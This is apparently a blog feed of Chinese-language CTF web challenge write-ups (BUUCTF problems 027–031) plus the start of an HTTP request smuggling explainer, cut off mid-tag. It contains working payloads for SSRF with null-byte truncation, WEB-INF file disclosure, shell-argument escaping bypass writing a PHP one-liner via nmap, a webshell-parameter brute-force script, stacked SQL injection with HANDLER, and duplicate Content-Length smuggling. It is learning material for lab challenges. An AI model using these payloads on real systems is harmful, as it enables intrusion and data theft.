    <url>/2021/02/14/BUU031/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸‰åä¸€ã€"><a href="#ä¸‰åä¸€ã€" class="headerlink" title="ä¸‰åä¸€ã€"></a>ä¸‰åä¸€ã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[GKCTF2020]cveç‰ˆç­¾åˆ°<img src="https://ae04.alicdn.com/kf/Hd6f117af6427409b82e72633a23c23f80.jpg" alt="01.png">        </p><p><img src="https://ae04.alicdn.com/kf/H28029521cc6044938bd53bc4f26855ec2.jpg" alt="02.png">         </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>hintä¸­åº”è¯¥æ˜¯ä¸€ä¸ªæ¼æ´ç¼–å·ï¼Œç™¾åº¦ä¸€ä¸‹<img src="https://ae02.alicdn.com/kf/H6eef43faf302452385b72f1c2a050747z.jpg" alt="03.png"><br>çœ‹ä¸‹PHPç‰ˆæœ¬  <img src="https://ae02.alicdn.com/kf/H5ef7d07828da403f95bf00e6b8b83553n.jpg" alt="04.png"><br>ç¬¦åˆ<br>çœ‹ä¸€ä¸‹<code>127.0.0.1</code>,ä½†ç”¨<code>\ 0</code>æˆªæ–­æ²¡å›æ˜¾ï¼Œæ¢æˆ<code>%00</code>å³å¯<img src="https://ae02.alicdn.com/kf/H1edfc2e6326f4b59bce8ef6367469123v.jpg" alt="05.png"><br>hostç»“å°¾å¿…é¡»æ˜¯123ï¼Œå°†1æ”¹ä¸º123å³å¯      </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p>payloadï¼š<code>?url=http://127.0.0.123%00www.ctfhub.com</code><br><img src="https://sc02.alicdn.com/kf/H23cec03d1a224fbf91a96bd93d2d4631t.jpg" alt="06.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜030</title>
    <link href="/2021/02/13/BUU030/"/>
    <url>/2021/02/13/BUU030/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸‰åã€"><a href="#ä¸‰åã€" class="headerlink" title="ä¸‰åã€"></a>ä¸‰åã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[RoarCTF 2019]Easy Java<br><img src="https://ae03.alicdn.com/kf/H06f76bd90727420d9a893f3f4a243f6c6.jpg" alt="01.png">          </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é¢˜ç›®æ˜¯easy Javaï¼Œå¯¹Javaçš„äº†è§£ä¸æ˜¯å¾ˆå¤š<br>helpç‚¹å‡»åçš„é¡µé¢æ˜¯<img src="https://ae04.alicdn.com/kf/Had5c3fd12baf421f8b1023f21b324039V.jpg" alt="02.png"><br>çœ‹wpè¯´æ”¹ä¸ºä»¥POSTæ–¹å¼ï¼Œå¾—åˆ°ä¸€ä¸ªwordæ–‡ä»¶ï¼Œä½†æ²¡å•¥ç”¨<br>è€ƒç‚¹ï¼š<code>WEB-INF/web.xml</code>æ³„éœ²          </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p><code>filename=WEB-INF/web.xml</code>æäº¤å¾—åˆ°æ–‡ä»¶<img src="https://ae04.alicdn.com/kf/H22b1b111c74341ed9855f318ce43b62ba.jpg" alt="03.png"><br>åœ¨æ–‡ä»¶ä¸­å‘ç°flagç›¸å…³çš„è·¯å¾„<code>/Flag</code><img src="https://ae02.alicdn.com/kf/H956a300f54424ef691634d55c4389913L.jpg" alt="04.png"><br>è®¿é—®ï¼Œå¾—åˆ°è·¯å¾„<img src="https://ae03.alicdn.com/kf/H1309e326ea0b42e395c89b6a17a516cak.jpg" alt="05.png"><br>è¿™ä¸ªå’Œåˆšæ‰æ–‡ä»¶é‡Œçš„<code>FlagController</code>çš„å®Œæ•´ç±»åä¸€æ ·ï¼Œåªä¸è¿‡<code>/</code>æ¢æˆ<code>.</code><br>æäº¤<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code>å¾—åˆ°æ–‡ä»¶ï¼Œå‘ç°ä¸€ä¸²base64ï¼Œè§£ç å¾—åˆ°flag<img src="https://ae03.alicdn.com/kf/H5c274b3ec4a7496684b8bc36509309af6.jpg" alt="06.png">     </p><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>WEB-INF/web.xmlæ³„éœ²<br><img src="https://ae02.alicdn.com/kf/H675a2d221b8c489b8ceae6abde6a176dX.jpg" alt="07.png">        </li><li>Java webå·¥ç¨‹ç›®å½•ç»“æ„<br><img src="https://ae03.alicdn.com/kf/H02fb99991afc4e9a8f4d9c7e395a1fa6G.jpg" alt="08.png">     </li><li>servletè®¿é—®URLæ˜ å°„é…ç½®    </li><li>Servletï¼ˆServer Appletï¼‰æ˜¯Java Servletçš„ç®€ç§°ï¼Œç§°ä¸ºå°æœåŠ¡ç¨‹åºæˆ–æœåŠ¡è¿æ¥å™¨ï¼Œç”¨Javaç¼–å†™çš„æœåŠ¡å™¨ç«¯ç¨‹åºï¼Œå…·æœ‰ç‹¬ç«‹äºå¹³å°å’Œåè®®çš„ç‰¹æ€§ï¼Œä¸»è¦åŠŸèƒ½åœ¨äºäº¤äº’å¼åœ°æµè§ˆå’Œç”Ÿæˆæ•°æ®ï¼Œç”ŸæˆåŠ¨æ€Webå†…å®¹ã€‚            </li><li>ç‹­ä¹‰çš„Servletæ˜¯æŒ‡Javaè¯­è¨€å®ç°çš„ä¸€ä¸ªæ¥å£ï¼Œå¹¿ä¹‰çš„Servletæ˜¯æŒ‡ä»»ä½•å®ç°äº†è¿™ä¸ªServletæ¥å£çš„ç±»ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œäººä»¬å°†Servletç†è§£ä¸ºåè€…ã€‚Servletè¿è¡Œäºæ”¯æŒJavaçš„åº”ç”¨æœåŠ¡å™¨ä¸­ã€‚ä»åŸç†ä¸Šè®²ï¼ŒServletå¯ä»¥å“åº”ä»»ä½•ç±»å‹çš„è¯·æ±‚ï¼Œä½†ç»å¤§å¤šæ•°æƒ…å†µä¸‹Servletåªç”¨æ¥æ‰©å±•åŸºäºHTTPåè®®çš„WebæœåŠ¡å™¨ã€‚        </li><li>ç”±äºå®¢æˆ·ç«¯æ˜¯é€šè¿‡URLåœ°å€è®¿é—®WebæœåŠ¡å™¨ä¸­çš„èµ„æºï¼Œæ‰€ä»¥Servletç¨‹åºè‹¥æƒ³è¢«å¤–ç•Œè®¿é—®ï¼Œå¿…é¡»æŠŠServletç¨‹åºæ˜ å°„åˆ°ä¸€ä¸ªURLåœ°å€ä¸Šï¼Œè¿™ä¸ªå·¥ä½œåœ¨web.xmlæ–‡ä»¶ä¸­ä½¿ç”¨<servlet>å…ƒç´ å’Œ<servlet-mapping>å…ƒç´ å®Œæˆã€‚<servlet>å…ƒç´ ç”¨äºæ³¨å†ŒServletï¼Œå®ƒåŒ…å«æœ‰ä¸¤ä¸ªä¸»è¦çš„å­å…ƒç´ ï¼š<servlet-name>å’Œ<servlet-class>ï¼Œåˆ†åˆ«ç”¨äºè®¾ç½®Servletçš„æ³¨å†Œåç§°å’ŒServletçš„å®Œæ•´ç±»åã€‚ä¸€ä¸ª<servlet-mapping>å…ƒç´ ç”¨äºæ˜ å°„ä¸€ä¸ªå·²æ³¨å†Œçš„Servletçš„ä¸€ä¸ªå¯¹å¤–è®¿é—®è·¯å¾„ï¼Œå®ƒåŒ…å«æœ‰ä¸¤ä¸ªå­å…ƒç´ ï¼š<servlet-name>å’Œ<url-pattern>ï¼Œåˆ†åˆ«ç”¨äºæŒ‡å®šServletçš„æ³¨å†Œåç§°å’ŒServletçš„å¯¹å¤–è®¿é—®è·¯å¾„ï¼Œå¦‚ï¼š</li></ul><p><img src="https://ae04.alicdn.com/kf/He9286c2954d14cf28a02afe6f7531d1ah.jpg" alt="09.png">        </p><p><a href="https://www.cnblogs.com/karsa/p/13130130.html">è½¬è‡ª</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜029</title>
    <link href="/2021/02/12/BUU029/"/>
    <url>/2021/02/12/BUU029/</url>
    
    <content type="html"><![CDATA[<h2 id="äºŒåä¹ã€"><a href="#äºŒåä¹ã€" class="headerlink" title="äºŒåä¹ã€"></a>äºŒåä¹ã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[BUUCTF 2018]Online Tool<br>PHPä»£ç å®¡è®¡      </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;    $_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];&#125;   <span class="hljs-comment">//è·å–IPåœ°å€</span><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125; <span class="hljs-keyword">else</span> &#123;    $host = $_GET[<span class="hljs-string">&#x27;host&#x27;</span>];    $host = escapeshellarg($host);      <span class="hljs-comment">//å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·</span>    $host = escapeshellcmd($host);        <span class="hljs-comment">//å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œåœ¨ä¸€äº›å­—ç¬¦å‰åŠ ä¸Šæ–œæ \</span>    $sandbox = md5(<span class="hljs-string">&quot;glzjin&quot;</span>. $_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.$sandbox;    @mkdir($sandbox);       <span class="hljs-comment">//æ–°å»ºä¸€ä¸ªä»¥$sandboxå‘½åçš„ç›®å½•ï¼Œ@æ˜¯å‹åˆ¶é”™è¯¯æç¤ºçš„æ„æ€</span>    chdir($sandbox);       <span class="hljs-comment">//å°†PHPå½“å‰ç›®å½•æ”¹ä¸º$sandbox</span>    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);&#125;</code></pre></code></pre><p>å¤§è‡´æ€è·¯å°±æ˜¯æ„é€ payloadï¼Œç»•è¿‡<code>escapeshellarg</code>å’Œ<code>escapeshellcmd</code>ï¼Œæ‰§è¡Œå‘½ä»¤<br>è¿™ä¸¤ä¸ªå‡½æ•°ä¸€èµ·ä½¿ç”¨çš„æ¼æ´ï¼š<br>æŠ„ä¸€ä¸‹å¤§ä½¬çš„ç¬”è®°ï¼š<br><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">è°ˆè°ˆescapeshellargå‚æ•°ç»•è¿‡å’Œæ³¨å…¥çš„é—®é¢˜ </a>     </p><blockquote><p>ä¼ å…¥çš„å‚æ•°æ˜¯:<code>127.0.0.1&#39; -v -d a=1</code><br>ç”±äºescapeshellargå…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚æ‰€ä»¥å¤„ç†ä¹‹åçš„æ•ˆæœ:<code>&#39;127.0.0.1&#39;\&#39;&#39; -v -d a=1&#39;</code><br>ç»è¿‡escapeshellcmdé’ˆå¯¹ç¬¬äºŒæ­¥å¤„ç†ä¹‹åçš„å‚æ•°ä¸­çš„\ä»¥åŠa=1â€™ä¸­çš„å•å¼•å·è¿›è¡Œå¤„ç†è½¬ä¹‰ä¹‹åçš„æ•ˆæœ:<code>&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code>         </p></blockquote><p>ä½†æˆ‘è‡ªå·±è¯•çš„è¯å¼„ä¸å‡ºæ¥å¤§ä½¬çš„ç»“æœï¼Œå‡ºæ¥çš„æœ‰<code>^</code>æ²¡æœ‰<code>\</code>?????<br>æ„é€ payload<br>åˆ©ç”¨nmapçš„ä¸€ä¸ªå‚æ•°<code>-oG</code>â€”â€“å¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™å…¥æ–‡ä»¶<br>æ‰€ä»¥ï¼Œå°±å¯ä»¥åˆ©ç”¨è¯¥å‚æ•°å†™å…¥ä¸€å¥è¯æœ¨é©¬    </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p>payloadï¼š<code>?host=&#39; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#39;</code><img src="https://ftp.bmp.ovh/imgs/2021/03/6c39ee2077cc0e8f.png"><br>è®¿é—®è¯¥æ–‡ä»¶å³å¯<code>/30a6175a3ca36e9980135ca86411d9ff/test.php</code><img src="https://ftp.bmp.ovh/imgs/2021/03/03dc8d99a324aafd.png">      </p><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><p>å‡ ä¸ªå‡½æ•°       </p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/61248aaf11e6755b.png">    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/c9b7073500bc6c82.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜028</title>
    <link href="/2021/02/11/BUU028/"/>
    <url>/2021/02/11/BUU028/</url>
    
    <content type="html"><![CDATA[<h2 id="äºŒåå…«ã€"><a href="#äºŒåå…«ã€" class="headerlink" title="äºŒåå…«ã€"></a>äºŒåå…«ã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢<br><img src="https://ae04.alicdn.com/kf/H0c5d474d5be84e36bf49ea28ff95588fv.jpg" alt="02.png">      </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è®¿é—®<code>www.tar.gz</code>å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢æœ‰3002ä¸ªPHPæ–‡ä»¶ï¼Œ<img src="https://ae04.alicdn.com/kf/Hf19fd81889a14126917af7acb6db6830p.jpg" alt="03.png"><br>æœ‰shellï¼Œåº”è¯¥æ˜¯åªæœ‰ä¸€ä¸ªæ˜¯æœ‰æ•ˆçš„å§ï¼Œæ‰€ä»¥è€ƒçš„åº”è¯¥æ˜¯pythonå†™è„šæœ¬çš„èƒ½åŠ›äº†         </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p><a href="https://blog.csdn.net/a3320315/article/details/102945940">å¤§ä½¬</a>çš„è„šæœ¬      </p><pre><code><pre><code class="hljs php">import osimport requestsimport reimport threadingimport time<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;å¼€å§‹æ—¶é—´ï¼š  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))s1=threading.Semaphore(<span class="hljs-number">100</span>)    <span class="hljs-comment">#è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°</span>filePath = r<span class="hljs-string">&quot;D:/soft/phpstudy/PHPTutorial/WWW/src/&quot;</span>os.chdir(filePath)<span class="hljs-comment">#æ”¹å˜å½“å‰çš„è·¯å¾„</span>requests.adapters.DEFAULT_RETRIES = <span class="hljs-number">5</span><span class="hljs-comment">#è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥</span>files = os.listdir(filePath)session = requests.Session()session.keep_alive = <span class="hljs-literal">False</span> <span class="hljs-comment"># è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse</span>def get_content(file):    s1.acquire()    <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;trying   &#x27;</span>+file+ <span class="hljs-string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))    with open(file,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<span class="hljs-comment">#æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°</span>            gets = <span class="hljs-keyword">list</span>(re.findall(<span class="hljs-string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))            posts = <span class="hljs-keyword">list</span>(re.findall(<span class="hljs-string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))    data = &#123;&#125;<span class="hljs-comment">#æ‰€æœ‰çš„$_POST</span>    params = &#123;&#125;<span class="hljs-comment">#æ‰€æœ‰çš„$_GET</span>    <span class="hljs-keyword">for</span> m in gets:        params[m] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>    <span class="hljs-keyword">for</span> n in posts:        data[n] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>    url = <span class="hljs-string">&#x27;http://127.0.0.1/src/&#x27;</span>+file    req = session.post(url, data=data, params=params)<span class="hljs-comment">#ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST</span>    req.close()<span class="hljs-comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span>    req.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>    content = req.text    <span class="hljs-comment">#print(content)</span>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> in content:<span class="hljs-comment">#å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°</span>        flag = <span class="hljs-number">0</span>        <span class="hljs-keyword">for</span> a in gets:            req = session.get(url+<span class="hljs-string">&#x27;?%s=&#x27;</span>%a+<span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)            content = req.text            req.close()<span class="hljs-comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> in content:                flag = <span class="hljs-number">1</span>                <span class="hljs-keyword">break</span>        <span class="hljs-keyword">if</span> flag != <span class="hljs-number">1</span>:            <span class="hljs-keyword">for</span> b in posts:                req = session.post(url, data=&#123;b:<span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)                content = req.text                req.close()<span class="hljs-comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> in content:                    <span class="hljs-keyword">break</span>        <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:<span class="hljs-comment">#flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ</span>            param = a        <span class="hljs-keyword">else</span>:            param = b        <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š &#x27;</span>+file+<span class="hljs-string">&quot;  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s&quot;</span> %param)        <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;ç»“æŸæ—¶é—´ï¼š  &#x27;</span> + time.asctime(time.localtime(time.time())))    s1.release()<span class="hljs-keyword">for</span> i in files:<span class="hljs-comment">#åŠ å…¥å¤šçº¿ç¨‹</span>   t = threading.Thread(target=get_content, args=(i,))   t.start()</code></pre></code></pre><p>è¿è¡Œ<br><img src="https://sc03.alicdn.com/kf/Hdef4496632754ec3885fb3bc8cfd8668W.jpg" alt="04.png"><br>payloadï¼š<code>/xk0SzyKwfzw.php?Efa5BVG=cat /flag</code>å¾—åˆ°flag<img src="https://ae02.alicdn.com/kf/H85c10a4376734c50af5ce78f50a844700.jpg" alt="01.png"> </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜027</title>
    <link href="/2021/02/10/BUU027/"/>
    <url>/2021/02/10/BUU027/</url>
    
    <content type="html"><![CDATA[<h2 id="äºŒåä¸ƒã€"><a href="#äºŒåä¸ƒã€" class="headerlink" title="äºŒåä¸ƒã€"></a>äºŒåä¸ƒã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[GYCTF2020]Blacklist<br><img src="https://ftp.bmp.ovh/imgs/2021/02/047fc4c497b8d336.png">       </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å’Œä¹‹å‰åšè¿‡çš„å·®ä¸å¤šï¼Œç›¸å½“äºå‡çº§ç‰ˆï¼Œä¹Ÿå¯ä»¥ç”¨å †å æ³¨å…¥ï¼Œä½†è¿™æ¬¡åŠ äº†ä¸€äº›è¿‡æ»¤ï¼Œæ”¹åå­—çš„æ“ä½œä¸è¡Œäº†<img src="https://ftp.bmp.ovh/imgs/2021/02/703e343d31dac4f9.png"><br><code>1&#39;;show databases;</code>å¾—åˆ°åº“å<img src="https://ftp.bmp.ovh/imgs/2021/02/c38457bb4192a2f2.png"><br><code>1&#39;;show tables;</code>å¾—åˆ°è¡¨å<img src="https://ftp.bmp.ovh/imgs/2021/02/9a69363862a7a5ea.png"><br><code>1&#39;;show columns from `FlagHere`; </code>å¾—åˆ°åˆ—å<br><img src="https://ftp.bmp.ovh/imgs/2021/02/863a0a03562ca06c.png"><br>selectè¢«ç¦äº†ï¼Œçœ‹wpè¯´ç”¨<code>handler</code>      </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p>payloadï¼š<code>1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;</code><img src="https://ftp.bmp.ovh/imgs/2021/02/7070e0cd90aa2c19.png">     </p><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li><code>handler</code>     <blockquote><p>handlerè¯­å¥å¯ä»¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨çš„æ•°æ®ï¼Œå®ƒæ˜¯MySQLçš„ä¸“ç”¨è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­<br><code>handler tbl_name open</code>æ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæ˜¯å£°æ˜äº†ä¸€ä¸ªåä¸º<code>tbl_name</code>çš„å¥æŸ„<br><code>handler tbl_name read first</code>è·å–ç¬¬ä¸€è¡Œï¼Œ<code>read next</code>ä¸‹ä¸€è¡Œï¼›æœ€åä¸€è¡Œæ‰§è¡Œåå†æ‰§è¡Œnextä¼šè¿”å›ä¸€ä¸ªç©ºç»“æœ<br><code>handler tbl_name close</code>å…³é—­æ‰“å¼€çš„å¥æŸ„<br><a href="https://www.cnblogs.com/taoyaostudy/p/13479367.html">MORE</a></p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Httpsmuggling</title>
    <link href="/2021/02/09/httpsmuggling/"/>
    <url>/2021/02/09/httpsmuggling/</url>
    
    <content type="html"><![CDATA[<h2 id="HTTPsmuggling"><a href="#HTTPsmuggling" class="headerlink" title="HTTPsmuggling"></a>HTTPsmuggling</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/02/b8e5ad2eec4243f0.png"><br><a href="https://paper.seebug.org/1048/#31-cl0get">å›¾ç‰‡è½¬è‡ª</a><br>åå‘ä»£ç†æœåŠ¡å™¨ä¸åç«¯æœåŠ¡å™¨ä¹‹é—´ä¼šé‡ç”¨TCPè¿æ¥<br>å½“æˆ‘ä»¬å‘ä»£ç†æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œå¦‚æœä¸¤ä¸ªæœåŠ¡å™¨çš„å®ç°æ–¹å¼ä¸åŒï¼Œä¸¤è€…å¯¹æˆ‘ä»¬å‘é€çš„è¯·æ±‚è¯†åˆ«ä¸åŒï¼Œå¯èƒ½ä»£ç†æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ï¼Œä½†æºç«™æœåŠ¡å™¨ç»è¿‡è§£æå¤„ç†åï¼Œåªè®¤ä¸ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„é‚£ä¸€éƒ¨åˆ†ï¼Œå°±ç®—æ˜¯èµ°ç§çš„è¯·æ±‚ã€‚      </p><h3 id="åˆ©ç”¨åˆ¤æ–­"><a href="#åˆ©ç”¨åˆ¤æ–­" class="headerlink" title="åˆ©ç”¨åˆ¤æ–­"></a>åˆ©ç”¨åˆ¤æ–­</h3><p>Apache ATS 6.0.0<del>6.2.2ç‰ˆæœ¬<br>å’Œ<br>Apache ATS 7.0.0</del>7.1.3ç‰ˆæœ¬     </p><h3 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h3><h4 id="CLä¸ä¸º0"><a href="#CLä¸ä¸º0" class="headerlink" title="CLä¸ä¸º0"></a>CLä¸ä¸º0</h4><p>å‰ç«¯ä»£ç†æœåŠ¡å™¨å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œè€Œåç«¯ä¸å…è®¸ï¼Œä¼šç›´æ¥å¿½ç•¥<code>Content-Length</code>ï¼Œä¸è¿›è¡Œå¤„ç†ã€‚</p><pre><code>GET / HTTP/1.1Host: example.comContent-Length: 44GET / secret HTTP/1.1Host: example.com\r\n   </code></pre><p>è¿™æ ·çš„ï¼Œåˆ°äº†åç«¯å°±ä¼šè®¤ä¸ºæ˜¯ä¸¤ä¸ªè¯·æ±‚        </p><h4 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h4><p>ä¸¤ä¸ª<code>Content-Length</code>       </p><pre><code>POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 8\r\nContent-Length: 7\r\n12345\r\na       </code></pre><p>å‰ç«¯ä»£ç†æœåŠ¡å™¨æŒ‰ç¬¬ä¸€ä¸ªå¤„ç†ï¼Œåç«¯æŒ‰ç¬¬äºŒä¸ªå¤„ç†ï¼Œæœ€åä¼šå‰©ä¸‹ä¸€ä¸ª<code>a</code>ï¼Œä¸‹ä¸€æ¬¡è¯·æ±‚æ—¶ï¼Œ<code>a</code>ä¾¿ä¼šæ‹¼æ¥åˆ°ä¸‹ä¸€è¯·æ±‚çš„å¼€å¤´      </p><pre><code>aGET /index.html HTTP/1.1\r\nHost: example.com\r\n       </code></pre><p>æ —å­ï¼š<br>é¢˜ç›®ï¼š[RoarCTF 2019]Easy Calc<br>æºç ä¸­å‘ç°<code>calc.php</code>,æ˜¯ä¸€æ®µPHPä»£ç <br>è€Œä¸”æœ¬é¢˜åŠ äº†WAFï¼Œé™¤äº†æ•°å­—å’Œä¸€äº›è¿ç®—ç¬¦å·éƒ½ä¸èƒ½æ­£å¸¸è¾“å‡ºï¼ŒæŠ“åŒ…åï¼Œ<br><img 